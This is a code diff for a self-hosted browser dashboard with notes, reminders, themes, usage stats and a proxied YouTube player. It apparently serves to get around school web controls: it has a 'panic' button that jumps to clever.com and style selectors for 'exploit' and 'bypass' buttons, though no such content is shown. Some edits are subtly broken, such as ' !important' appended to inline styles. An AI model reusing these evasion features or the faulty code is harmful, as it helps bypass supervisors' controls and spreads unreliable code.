-                            <label for="dataExportBtn">Export User Data:</label>
-                            <button id="dataExportBtn">Export JSON</button>
-                        </div>
-                        <div class="setting-item">
-                            <label for="clearCacheBtn">Clear Cache:</label>
-                            <button id="clearCacheBtn">Clear</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
         </div>
 
-        <div id="canvasContainer" style="display:none;">
+        <div id="canvasContainer">
             <h2>🖌️ Notes Canvas</h2>
             <canvas id="notesCanvas" width="800" height="500"></canvas>
             <div id="canvasControls">
-                <button id="clearCanvasBtn">Clear Canvas</button>
-                <button id="closeCanvasBtn">Close Notes</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- NEW: Activity Log Modal Structure -->
-    <div id="activityLogModal" class="log-modal-overlay">
-        <div class="log-modal-content">
-            <button class="log-modal-close-btn" onclick="dashboard.hideActivityLogModal()">&times;</button>
-            <h2>📜 Activity Log</h2>
-            <div class="log-modal-body" id="activityLogBody">
-                <!-- Log entries will be populated here -->
+                <button id="clearCanvasBtn" class="action-button red">Clear Canvas</button>
+                <button id="closeCanvasBtn" class="action-button blue">Close Notes</button>
             </div>
         </div>
     </div>
@@ -1276,73 +1253,61 @@ To view all available shortcuts for the specific app you are using, press and ho
     <script>
         const dashboard = {
             activePanel: null,
-            activityLogHistory: JSON.parse(localStorage.getItem('activityLogHistory') || '[]'), // Persistent log
+            activityLogHistory: JSON.parse(localStorage.getItem('activityLogHistory') || '[]'),
             
-            // Track dynamic usage stats
             stats: {
                 clicks: parseInt(localStorage.getItem('stats_clicks') || '0'),
                 panelsOpened: parseInt(localStorage.getItem('stats_panels_opened') || '0'),
                 themeToggles: parseInt(localStorage.getItem('stats_theme_toggles') || '0'),
                 remindersSet: parseInt(localStorage.getItem('stats_reminders_set') || '0'),
-                canvasSaves: parseInt(localStorage.getItem('stats_canvas_used') || '0'), // Renamed from canvasUsed
+                canvasSaves: parseInt(localStorage.getItem('stats_canvas_used') || '0'),
                 screenshotsTaken: parseInt(localStorage.getItem('stats_screenshots') || '0'),
                 mediaLoaded: parseInt(localStorage.getItem('stats_media_loaded') || '0'),
-                sessionUptime: '00:00:00', // Reset per session, updated by timer
-                timeToLogin: parseInt(localStorage.getItem('stats_timeToLogin') || '0'), // Persist time to login
+                sessionUptime: '00:00:00',
+                timeToLogin: parseInt(localStorage.getItem('stats_timeToLogin') || '0'),
             },
             
-            // NEW: Function to log alerts (to both UI notification and persistent history)
+            // NEW: Function to log alerts (to both fading UI notification and persistent history)
             logAlert: function(message) {
                 const now = new Date();
-                const timestamp = now.toLocaleTimeString('en-US', { hour12: false }); // 24-hour format
-                const fullMessage = `<span class="notification-timestamp">${timestamp}</span> ${message}`;
+                const timestampFormatted = now.toLocaleTimeString('en-US', { hour12: false }); // 24-hour format
+                const fullMessageHTML = `<span class="notification-timestamp">${timestampFormatted}</span> ${message}`;
 
                 // Add to fading notification UI
                 const container = document.getElementById('notificationContainer');
                 const notification = document.createElement('div');
                 notification.classList.add('dashboard-notification');
-                notification.innerHTML = fullMessage; // Use innerHTML to parse timestamp span
+                notification.innerHTML = fullMessageHTML;
                 
-                // Add close button
                 const closeBtn = document.createElement('button');
                 closeBtn.classList.add('notification-close-btn');
                 closeBtn.innerHTML = '&times;';
-                closeBtn.onclick = () => notification.remove();
+                closeBtn.onclick = (event) => {
+                  notification.remove();
+                  event.stopPropagation(); // Prevent trigger parent click handlers if any
+                };
                 notification.appendChild(closeBtn);
 
-                container.prepend(notification); // Add to the top of the notifications list
+                container.prepend(notification);
 
-                // Trigger fade-out animation after display
+                // Trigger fade-out animation after display time
                 setTimeout(() => {
                     notification.classList.add('fade-out');
                     notification.addEventListener('animationend', () => {
                         notification.remove();
                     }, { once: true });
-                }, 3000); // Fades out after 3 seconds visible
+                }, 3000);
 
-
-                // Add to persistent activity log history
+                // Add to persistent activity log history (ISO for storage)
                 const logEntry = {
-                    timestamp: now.toISOString(), // ISO for full precision
-                    message: message // Store plain message
+                    timestamp: now.toISOString(),
+                    message: message
                 };
-                dashboard.activityLogHistory.unshift(logEntry); // Add newest first
-                // Keep log history reasonable size, e.g., last 100 entries
+                dashboard.activityLogHistory.unshift(logEntry);
                 if (dashboard.activityLogHistory.length > 100) {
                     dashboard.activityLogHistory.pop();
                 }
-                localStorage.setItem('activityLogHistory', JSON.stringify(dashboard.activityLogHistory)); // Persist
-
-            },
-
-            // --- FADING INFO BOX: Display function replacement for notifications ---
-            // Replaces dashboard.showNotification calls from previous iterations
-            displayActionMessage: function(message) {
-                this.logAlert(message); // Now routes through the new fading log system
-                
-                this.stats.clicks++; // General clicks increment
-                localStorage.setItem('stats_clicks', this.stats.clicks.toString()); // Persist
-                this.updateStatsDisplay(); // Update stats display with latest count
+                localStorage.setItem('activityLogHistory', JSON.stringify(dashboard.activityLogHistory));
             },
 
             // Updates specific CSS variables for themes and custom colors
@@ -1350,48 +1315,75 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const root = document.documentElement;
 
                 if (document.body.classList.contains('light-theme')) {
-                    root.style.setProperty('--main-bg', '#f0f0f0');
+                    root.style.setProperty('--main-bg-start', '#f0f0f0');
+                    root.style.setProperty('--main-bg-end', '#dddddd');
                     root.style.setProperty('--main-text-color', '#333');
                     root.style.setProperty('--box-bg-dark', '#fcfcfc');
                     root.style.setProperty('--item-bg-alt-dark', '#eee');
                     root.style.setProperty('--panel-bg-dark', '#fcfcfc');
-                    root.style.setProperty('--heading-color-light', '#994d00');
+                    root.style.setProperty('--heading-color-dark', '#994d00');
                 } else {
-                    root.style.setProperty('--main-bg', '#0d0d0d');
+                    root.style.setProperty('--main-bg-start', '#0d0d0d');
+                    root.style.setProperty('--main-bg-end', '#1a1a1a');
                     root.style.setProperty('--main-text-color', '#e0e0e0');
                     root.style.setProperty('--box-bg-dark', '#2a2a2a');
                     root.style.setProperty('--item-bg-alt-dark', '#3b3b3b');
                     root.style.setProperty('--panel-bg-dark', '#2a2a2a');
                     root.style.setProperty('--heading-color-dark', '#ffbf80');
                 }
+                
+                // Update body background immediately as it's a unified gradient
+                document.body.style.background = `linear-gradient(135deg, var(--main-bg-start), var(--main-bg-end))` + ` !important`;
+                document.body.style.backgroundAttachment = `fixed` + ` !important`;
 
                 const accentColor = localStorage.getItem('accentColor') || '#ff914d';
                 root.style.setProperty('--accent-color', accentColor);
-                root.style.setProperty('--accent-color-light-hover', this.lightenColor(accentColor, 20));
-                root.style.setProperty('--accent-color-hover-shadow', this.lightenColor(accentColor, 20, true));
+                // Calculate slightly different shades for hover and shadows
+                const lightHoverColor = this.lightenColor(accentColor, 10);
+                const hoverShadowColor = this.lightenColor(accentColor, 10, true);
+                root.style.setProperty('--accent-color-light-hover', lightHoverColor);
+                root.style.setProperty('--accent-color-hover-shadow', hoverShadowColor);
+                
+                // Apply gradient colors to header
                 const headerBgCustom = localStorage.getItem('headerBgColor') || accentColor;
                 document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${headerBgCustom}, ${this.lightenColor(headerBgCustom, 30)})`;
 
+                // General color adjustments to UI elements
                 document.getElementById('loginBox').style.borderColor = accentColor;
-                document.getElementById('loginBox').style.boxShadow = `0 0 25px ${this.lightenColor(accentColor, 20, true)}`;
+                document.getElementById('loginBox').style.boxShadow = `0 0 25px ${hoverShadowColor}`;
             
-                // Apply custom styles to dynamic elements as they are theme/accent dependent
-                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
-                document.querySelectorAll('.box h2').forEach(h2 => {
-                  if (document.body.classList.contains('light-theme')) h2.style.color = 'var(--heading-color-light)';
-                  else h2.style.color = this.lightenColor(accentColor, 15);
-                });
-                
-                // Unified button styles. Re-applying accent borders/colors dynamically.
-                document.querySelectorAll('.login-box button, .action-button, .quickbar-container button, .button-grid-container .box button, .button-grid-container .box a').forEach(btn => {
-                    if (btn.id === 'panicBtn') return; // Don't override panic button special style
+                // Unified button styles - apply accents
+                document.querySelectorAll('.login-box button, .action-button, .quickbar-container button, .button-grid-container .box button, .button-grid-container .box a, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .reminder-item button').forEach(btn => {
+                    if (btn.id === 'panicBtn') return; // Don't override panic button's specific red style
                     btn.style.borderColor = accentColor;
                     btn.style.color = accentColor;
                     btn.style.boxShadow = `0 0 10px ${this.lightenColor(accentColor, 20, true)}`;
                 });
+
+                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
+                document.querySelectorAll('.box h2').forEach(h2 => {
+                  // Keep color based on light/dark theme to be readable, potentially influenced by accent slightly
+                  if (document.body.classList.contains('light-theme')) h2.style.color = 'var(--heading-color-dark)'; /* Use predefined light-theme heading */
+                  else h2.style.color = 'var(--heading-color-dark)'; /* Use predefined dark-theme heading */
+                });
+                
+                // Ensure text inside light/dark themed boxes and panels is visible
+                document.querySelectorAll('.box').forEach(box => {
+                    box.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--box-bg-dark)' : 'var(--box-bg-dark)';
+                    box.style.boxShadow = `0 0 18px ${this.lightenColor(accentColor, 20, true)}`;
+                });
+                document.querySelectorAll('.info-panel').forEach(panel => {
+                    panel.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--panel-bg-dark)' : 'var(--panel-bg-dark)';
+                    panel.style.boxShadow = `0 0 20px ${this.lightenColor(accentColor, 20, true)}`;
+                });
+
+                // Apply to new dashboard notification style
+                document.querySelectorAll('.dashboard-notification').forEach(notif => {
+                  notif.style.borderLeftColor = accentColor;
+                });
             },
 
-            // Helper to lighten/darken a hex color and optionally add transparency to it
+            // Helper to lighten a hex color and optionally add transparency (retained)
             lightenColor: function(hex, percent, addAlpha = false) {
                 let f=parseInt(hex.slice(1),16),t=percent<0?0:255,p=percent<0?percent*-1:percent,R=f>>16,G=(f>>8)&0x00ff,B=f&0x0000ff;
                 let newR = Math.round((t-R)*p/100)+R;
@@ -1409,20 +1401,24 @@ To view all available shortcuts for the specific app you are using, press and ho
 
             // --- Core Dashboard Initialization ---
             init: function() {
-                // Ensure default stats are loaded or initialized before use
+                // Initialize/load stats counters
                 Object.keys(this.stats).forEach(key => {
                     const storedValue = localStorage.getItem(`stats_${key}`);
                     if (storedValue !== null) {
-                        // Special handling for `sessionUptime` if stored as seconds to format.
                         if (key === 'sessionUptime') {
                             let totalSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0');
                             const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
                             const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
                             const secs = String(totalSeconds % 60).padStart(2, '0');
                             this.stats.sessionUptime = `${hrs}:${mins}:${secs}`;
-                        } else {
-                            this.stats[key] = (key === 'timeToLogin') ? parseInt(storedValue) : parseInt(storedValue);
+                        } else if (key === 'timeToLogin') {
+                             this.stats.timeToLogin = parseInt(storedValue);
                         }
+                         else {
+                            this.stats[key] = parseInt(storedValue);
+                        }
+                    } else { // Initialize default values in localStorage if they don't exist
+                        localStorage.setItem(`stats_${key}`, '0');
                     }
                 });
 
@@ -1433,23 +1429,22 @@ To view all available shortcuts for the specific app you are using, press and ho
                 this.initButtons();
                 this.initCanvas();
                 this.initPanels(); // Initialize ALL panels hidden first
-                this.initReminders(); // Re-add Reminders
+                this.initReminders(); // Re-add Reminders functionality
                 this.initSuperAdvancedStatsDisplay(); // Populate advanced stats fields
-                this.initMediaPlayer(); // Re-add Media Player
-                this.initSettings(); // Now primarily handles persistent settings that weren't moved to initThemeToggle
-
+                this.initMediaPlayer(); // Re-add Media Player functionality
+                this.initSettings(); // Manage general persistent settings
                 this.colorizeWifiLevels(); // Color code the wifi panel
 
-                this.logAlert("Dashboard functionality loaded. Welcome to Private System v2.0!"); // Initial dashboard load alert
+                this.logAlert("Dashboard functionality loaded. Welcome to Private System v2.0!");
 
                 // NEW: Attach listener for the Activity Log button
                 document.getElementById('activityLogBtn').addEventListener('click', () => {
                     dashboard.showActivityLogModal();
-                    dashboard.displayActionMessage("📜 Activity Log opened.");
+                    dashboard.logAlert("📜 Activity Log opened.");
                 });
             },
             
-            // --- Session Timer (with stats integration) ---
+            // --- Session Timer (retained) ---
             initSessionTimer: function() {
               let sessionSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0'); 
               
@@ -1461,9 +1456,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                   const formattedTime = `${hrs}:${mins}:${secs}`;
                   
                   document.getElementById('sessionTime').innerText = `Session Time: ${formattedTime}`;
-                  this.stats.sessionUptime = formattedTime; // Store formatted uptime
-                  localStorage.setItem('stats_sessionUptimeSeconds', sessionSeconds.toString()); // Persist seconds
-                  this.updateStatsDisplay(); // Update stat panel with latest uptime
+                  this.stats.sessionUptime = formattedTime;
+                  localStorage.setItem('stats_sessionUptimeSeconds', sessionSeconds.toString());
+                  this.updateStatsDisplay();
               }, 1000);
             },
 
@@ -1477,7 +1472,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 setInterval(updateClock, 1000);
             },
             
-            // --- Calendar ---
+            // --- Calendar (retained, fixed emoji directly in HTML for cleaner CSS/JS) ---
             generateCalendar: function() {
                 const calendar = document.getElementById('calendar');
                 calendar.innerHTML = '';
@@ -1499,7 +1494,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 }
             },
 
-            // --- Theme Toggle ---
+            // --- Theme Toggle (retained, adapted to new alert system) ---
             initThemeToggle: function() {
                 const themeBtn = document.getElementById('themeToggle');
                 themeBtn.addEventListener('click', () => {
@@ -1513,21 +1508,19 @@ To view all available shortcuts for the specific app you are using, press and ho
                     this.logAlert(`🎨 Theme toggled to ${isLightTheme ? 'Light' : 'Dark'}.`);
 
                     this.stats.themeToggles++;
-                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString()); // Persist
+                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString());
                     this.updateStatsDisplay();
                 });
 
-                // Apply saved theme on load (now ensures correct classes are applied before any custom style init)
                 const savedTheme = localStorage.getItem('theme');
                 if (savedTheme === 'light') {
                     document.body.classList.add('light-theme');
                 } else {
-                    document.body.classList.remove('light-theme'); // Ensure dark theme is default if not explicitly light
+                    document.body.classList.remove('light-theme');
                 }
-                // this.applyCustomStyles() is called by init in correct sequence
             },
 
-            // --- Quickbar & Main Buttons (re-verified logic and adapted for new alert system) ---
+            // --- Quickbar & Main Buttons (retained logic, adapted for new alert system) ---
             initButtons: function() {
                 document.getElementById('panicBtn').addEventListener('click', () => {
                     window.open('https://clever.com', '_blank');
@@ -1557,34 +1550,34 @@ To view all available shortcuts for the specific app you are using, press and ho
                     }
                 });
 
-                let zoomLevel = parseFloat(document.body.style.zoom || 1); // Get initial zoom level
+                let zoomLevel = parseFloat(document.body.style.zoom || 1);
                 document.getElementById('zoomInBtn').addEventListener('click', () => {
-                    zoomLevel = Math.min(2.0, zoomLevel + 0.1); // Max zoom 200%
+                    zoomLevel = Math.min(2.0, zoomLevel + 0.1);
                     document.body.style.zoom = zoomLevel;
                     this.logAlert(`➕ Zoom In (${Math.round(zoomLevel * 100)}%)`);
-                    this.updateStatsDisplay(); // Update zoom level stat
+                    this.updateStatsDisplay();
                 });
                 document.getElementById('zoomOutBtn').addEventListener('click', () => {
-                    zoomLevel = Math.max(0.5, zoomLevel - 0.1); // Min zoom 50%
+                    zoomLevel = Math.max(0.5, zoomLevel - 0.1);
                     document.body.style.zoom = zoomLevel;
                     this.logAlert(`➖ Zoom Out (${Math.round(zoomLevel * 100)}%)`);
-                    this.updateStatsDisplay(); // Update zoom level stat
+                    this.updateStatsDisplay();
                 });
-                
-                // Initialize zoom level for stats display
                 if(document.getElementById('statsZoom')) {
                     document.getElementById('statsZoom').innerText = `${Math.round(zoomLevel * 100)}%`;
                 }
 
                 document.getElementById('logoutBtn').addEventListener('click', () => {
                     if (confirm('Are you sure you want to log out?')) {
+                        localStorage.clear(); // Clear local storage on logout, including persistent log history
+                        sessionStorage.clear(); // Clear session storage
                         location.reload();
                     }
                     this.logAlert('👋 User logged out.');
                 });
 
                 document.getElementById('settingsBtn').addEventListener('click', () => {
-                    this.togglePanel('settingsPanel'); // Settings is a real panel, not in quickbar by spec.
+                    this.togglePanel('settingsPanel');
                     this.logAlert('🛠️ Settings panel accessed.');
                 });
                 
@@ -1595,14 +1588,14 @@ To view all available shortcuts for the specific app you are using, press and ho
                         link.href = canvas.toDataURL();
                         link.click();
                         this.stats.screenshotsTaken++;
-                        localStorage.setItem('stats_screenshots', this.stats.screenshotsTaken.toString()); // Persist
+                        localStorage.setItem('stats_screenshots', this.stats.screenshotsTaken.toString());
                         this.updateStatsDisplay();
                         this.logAlert('📸 Screenshot taken!');
                     });
                 });
             },
 
-            // --- Notes Canvas ---
+            // --- Notes Canvas (retained logic) ---
             initCanvas: function() {
                 const notesBtn = document.getElementById('notesBtn');
                 const canvasContainer = document.getElementById('canvasContainer');
@@ -1610,48 +1603,38 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const panelButtonGrid = document.getElementById('panelButtonGrid');
                 const updatesNotifications = document.getElementById('updatesNotifications');
 
-
                 notesBtn.addEventListener('click', () => {
-                    // Hide other main dashboard content to show canvas
                     mainGrid.style.display = 'none';
                     panelButtonGrid.style.display = 'none';
-                    updatesNotifications.style.display = 'none'; // Ensure this section also hides
-
+                    updatesNotifications.style.display = 'none';
                     canvasContainer.style.display = 'block';
                     this.logAlert('📝 Notes canvas opened.');
 
-                    // Stat for canvas interaction (each open considered an "interaction use")
                     this.stats.canvasSaves++;
-                    localStorage.setItem('stats_canvas_used', this.stats.canvasSaves.toString()); // Persist
+                    localStorage.setItem('stats_canvas_used', this.stats.canvasSaves.toString());
                     this.updateStatsDisplay();
                 });
 
                 document.getElementById('closeCanvasBtn').addEventListener('click', () => {
                     canvasContainer.style.display = 'none';
-                    // Restore other main content visibility
                     mainGrid.style.display = 'flex';
-                    panelButtonGrid.style.display = 'grid'; // Ensure it returns to grid
-                    updatesNotifications.style.display = 'flex'; // Ensure this section also shows
-
+                    panelButtonGrid.style.display = 'grid';
+                    updatesNotifications.style.display = 'flex';
                     this.logAlert('📝 Notes canvas closed.');
                 });
 
                 const canvas = document.getElementById('notesCanvas');
                 const ctx = canvas.getContext('2d');
                 
-                // Set default white background for canvas if not already
                 if (!localStorage.getItem('notesCanvasData')) {
                     ctx.fillStyle = '#fff';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
                 }
 
-                // Load saved notes from localStorage
                 const savedNotes = localStorage.getItem('notesCanvasData');
                 if (savedNotes) {
                     const img = new Image();
-                    img.onload = () => {
-                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                    };
+                    img.onload = () => { ctx.drawImage(img, 0, 0, canvas.width, canvas.height); };
                     img.src = savedNotes;
                 } else {
                     ctx.fillStyle = '#fff';
@@ -1662,10 +1645,8 @@ To view all available shortcuts for the specific app you are using, press and ho
 
                 function getPos(evt) {
                     const rect = canvas.getBoundingClientRect();
-                    return {
-                        x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
-                        y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top
-                    };
+                    return { x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
+                             y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top };
                 }
 
                 ['mousedown', 'touchstart'].forEach(evtName => {
@@ -1695,7 +1676,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
                     canvas.addEventListener(evtName, () => {
                         drawing = false;
-                        localStorage.setItem('notesCanvasData', canvas.toDataURL()); // Save upon interaction ending
+                        localStorage.setItem('notesCanvasData', canvas.toDataURL());
                     });
                 });
 
@@ -1715,28 +1696,25 @@ To view all available shortcuts for the specific app you are using, press and ho
                     this.logAlert('💾 Notes exported as image.');
                 });
                 
-                // Toggle sections functionality for main dashboard content
                 document.getElementById('toggleSectionsBtn').addEventListener('click', () => {
                     const mainRowDisplay = mainGrid.style.display;
                     const panelGridDisplay = panelButtonGrid.style.display;
 
-                    // Determine current state: If they are not visible, show them. Otherwise hide.
                     const isContentVisible = (mainRowDisplay !== 'none' && mainRowDisplay !== '') ||
                                              (panelGridDisplay !== 'none' && panelGridDisplay !== '');
 
-                    if (!isContentVisible) { // If currently hidden, show them
+                    if (!isContentVisible) {
                         mainGrid.style.display = 'flex';
                         panelButtonGrid.style.display = 'grid';
                         updatesNotifications.style.display = 'flex'; 
                         this.logAlert('↔️ Dashboard sections revealed.');
-                    } else { // If currently visible, hide them
+                    } else {
                         mainGrid.style.display = 'none';
                         panelButtonGrid.style.display = 'none';
                         updatesNotifications.style.display = 'none'; 
                         this.logAlert('↔️ Dashboard sections hidden.');
                     }
                     
-                    // Always hide notes canvas and any active info panel to maintain single focus area
                     canvasContainer.style.display = 'none'; 
                     if (this.activePanel) {
                         const panelName = this.activePanel.querySelector('h2').innerText.trim();
@@ -1747,9 +1725,8 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Panel Management (re-verified) ---
+            // --- Panel Management (retained) ---
             initPanels: function() {
-                // Ensure all info panels are hidden by default initially
                 document.querySelectorAll('.info-panel').forEach(panel => {
                     panel.style.display = 'none';
                 });
@@ -1767,7 +1744,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const panelTitleElement = panel.querySelector('h2');
                 const panelName = panelTitleElement ? panelTitleElement.innerText.trim() : panelId;
 
-                // Close currently active panel if different from current
                 if(this.activePanel && this.activePanel.id !== panelId) {
                     this.activePanel.style.display = 'none';
                     const activePanelTitle = this.activePanel.querySelector('h2').innerText.trim();
@@ -1775,12 +1751,11 @@ To view all available shortcuts for the specific app you are using, press and ho
                     this.activePanel = null;
                 }
 
-                // Toggle the requested panel's visibility
                 if (!isActive) {
                     panel.style.display = 'block';
                     this.activePanel = panel;
                     this.logAlert(`Panel Opened: ${panelName}.`);
-                    if (document.getElementById('statsPanelsOpened')) {
+                    if (!isActive) {
                         this.stats.panelsOpened++;
                         localStorage.setItem('stats_panels_opened', this.stats.panelsOpened.toString());
                     }
@@ -1814,6 +1789,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 }
             },
 
+            // --- WiFi Panel Coloring (retained) ---
             colorizeWifiLevels: function() {
                 document.querySelectorAll('.wifi-entry').forEach(entry => {
                     const levelDiv = entry.children[1];
@@ -1831,7 +1807,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Reminders System (re-verified) ---
+            // --- Reminders System (retained) ---
             reminders: [],
             initReminders: function() {
                 const addReminderBtn = document.getElementById('addReminderBtn');
@@ -1841,7 +1817,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const remindersList = document.getElementById('remindersList');
                 const clearAllRemindersBtn = document.getElementById('clearAllRemindersBtn');
 
-                // Load reminders from LocalStorage
                 this.loadReminders();
                 this.renderReminders();
 
@@ -1965,7 +1940,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             },
 
-            // --- Settings Panel Functions (adapted for new alert system and removals) ---
+            // --- Settings Panel Functions (retained) ---
             initSettings: function() {
                 const themeSelector = document.getElementById('themeSelector');
                 if (themeSelector) themeSelector.value = localStorage.getItem('theme') || 'dark';
@@ -1979,7 +1954,11 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const enableMotivationQuote = document.getElementById('enableMotivationQuote');
                 if (enableMotivationQuote) {
                     enableMotivationQuote.checked = localStorage.getItem('enableMotivationQuote') !== 'false';
-                    if (!enableMotivationQuote.checked) document.getElementById('motivationBox').style.display = 'none';
+                    const motivationBox = document.getElementById('motivationBox');
+                    if (motivationBox) {
+                        if (!enableMotivationQuote.checked) motivationBox.style.display = 'none';
+                        else motivationBox.style.display = 'flex'; // Ensure it's 'flex' as it was initially set as a flex container
+                    }
                 }
 
                 const desktopNotifications = document.getElementById('desktopNotifications');
@@ -2003,7 +1982,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 const enableLogging = document.getElementById('enableLogging');
                 if (enableLogging) enableLogging.checked = localStorage.getItem('enableLogging') !== 'false';
 
-                this.applySettingsToDOM(); // Re-apply existing visual settings to DOM elements.
+                this.applySettingsToDOM();
 
                 // Event Listeners for Settings
                 if (themeSelector) themeSelector.addEventListener('change', (e) => {
@@ -2047,7 +2026,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                 if (mainBgColorPicker) mainBgColorPicker.addEventListener('input', (e) => {
                     const color = e.target.value;
                     localStorage.setItem('mainBgColor', color);
-                    document.documentElement.style.setProperty('--main-bg', color);
+                    document.documentElement.style.setProperty('--main-bg-start', color); // Adjust the start of gradient
+                    // To instantly see change on the unified background:
+                    this.applyCustomStyles(); // Reapply styles to ensure body background updates too
                     this.logAlert(`Main background color changed to ${color}.`);
                 });
                 if (headerBgColorPicker) headerBgColorPicker.addEventListener('input', (e) => {
@@ -2066,8 +2047,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                     if (confirm('Are you sure you want to clear ALL local data (notes, reminders, settings, logs)? This cannot be undone.')) {
                         localStorage.clear();
                         this.logAlert('LocalStorage cleared. Page reloading...');
-                        // Also clear current in-memory log history
-                        dashboard.activityLogHistory = [];
+                        dashboard.activityLogHistory = []; // Clear in-memory history too
                         location.reload();
                     }
                 });
@@ -2096,7 +2076,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 document.querySelectorAll('.settings-grid').forEach(grid => {
                     grid.addEventListener('click', (e) => {
                         if (e.target.classList.contains('action-button') && e.target.textContent === 'Reset') {
-                            // Find the color input ID related to the clicked reset button
                             const pickerInput = e.target.closest('.color-picker').querySelector('input[type="color"]');
                             if (pickerInput) this.resetColorSetting(pickerInput.id);
                         }
@@ -2120,7 +2099,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                     else motivationBox.style.display = 'flex';
                 }
 
-                // Ensure initial values for color pickers are set and reflect localStorage
                 const accentColorPicker = document.getElementById('accentColorPicker');
                 if (accentColorPicker) accentColorPicker.value = localStorage.getItem('accentColor') || '#ff914d';
                 const mainBgColorPicker = document.getElementById('mainBgColorPicker');
@@ -2129,7 +2107,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 if (headerBgColorPicker) headerBgColorPicker.value = localStorage.getItem('headerBgColor') || (document.body.classList.contains('light-theme') ? this.lightenColor(accentColorPicker.value, 10) : (accentColorPicker.value));
 
 
-                this.applyCustomStyles(); // Call to set CSS variables based on theme/saved colors
+                this.applyCustomStyles();
             },
             resetColorSetting: function(pickerId) {
                 switch (pickerId) {
@@ -2140,21 +2118,21 @@ To view all available shortcuts for the specific app you are using, press and ho
                         break;
                     case 'mainBgColorPicker':
                         localStorage.removeItem('mainBgColor');
-                        document.getElementById('mainBgColorPicker').value = '#1a1a1a';
-                        document.documentElement.style.setProperty('--main-bg', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
+                        document.getElementById('mainBgColorPicker').value = '#1a1a1a'; // Default dark
+                        document.documentElement.style.setProperty('--main-bg-start', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
                         this.logAlert('Custom main background color reset.');
                         break;
                     case 'headerBgColorPicker':
                         localStorage.removeItem('headerBgColor');
-                        document.getElementById('headerBgColorPicker').value = '#ff914d';
+                        document.getElementById('headerBgColorPicker').value = '#ff914d'; // Default accent color
                         document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${document.getElementById('accentColorPicker').value}, ${this.lightenColor(document.getElementById('accentColorPicker').value, 30)})`;
                         this.logAlert('Custom header background color reset.');
                         break;
                 }
-                this.applyCustomStyles(); // Reapply all custom styles to ensure consistency
+                this.applyCustomStyles();
             },
 
-            // --- NEW: Super Advanced Statistics (logic and adapted for expanded fields) ---
+            // --- Super Advanced Statistics (logic and adapted for expanded fields) ---
             initSuperAdvancedStatsDisplay: function() {
                 const getBrowserName = () => {
                     const ua = navigator.userAgent;
@@ -2203,7 +2181,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 document.getElementById('statsHistoryLength') && (document.getElementById('statsHistoryLength').innerText = window.history.length.toString());
                 document.getElementById('statsNotificationPerm') && (document.getElementById('statsNotificationPerm').innerText = Notification.permission || 'N/A');
 
-                // Initial load from localStorage (happens in dashboard.init, so ensure these fields are updated from there)
                 this.updateStatsDisplay(); 
             },
             updateStatsDisplay: function() {
@@ -2219,14 +2196,13 @@ To view all available shortcuts for the specific app you are using, press and ho
                 document.getElementById('statsLocalStorageItems') && (document.getElementById('statsLocalStorageItems').innerText = localStorage.length.toString());
                 document.getElementById('statsSessionStorageItems') && (document.getElementById('statsSessionStorageItems').innerText = sessionStorage.length.toString());
 
-                // Update zoom in real-time
                 const zoomElement = document.getElementById('statsZoom');
                 if (zoomElement) {
                     zoomElement.innerText = `${Math.round(parseFloat(document.body.style.zoom || 1) * 100)}%`;
                 }
             },
 
-            // --- NEW: Proxied Media Player (re-verified) ---
+            // --- Proxied Media Player (retained) ---
             initMediaPlayer: function() {
               document.getElementById('loadYoutubeBtn').addEventListener('click', () => {
                   const input = document.getElementById('youtubeIdInput').value.trim();
@@ -2265,8 +2241,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                 dashboard.activityLogHistory.forEach(entry => {
                     const logEntryDiv = document.createElement('div');
                     logEntryDiv.classList.add('log-entry');
-                    const timestamp = new Date(entry.timestamp).toLocaleTimeString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' });
-                    logEntryDiv.innerHTML = `<span class="timestamp">${timestamp}</span> ${entry.message}`;
+                    // Display timestamp in a readable format for the log modal
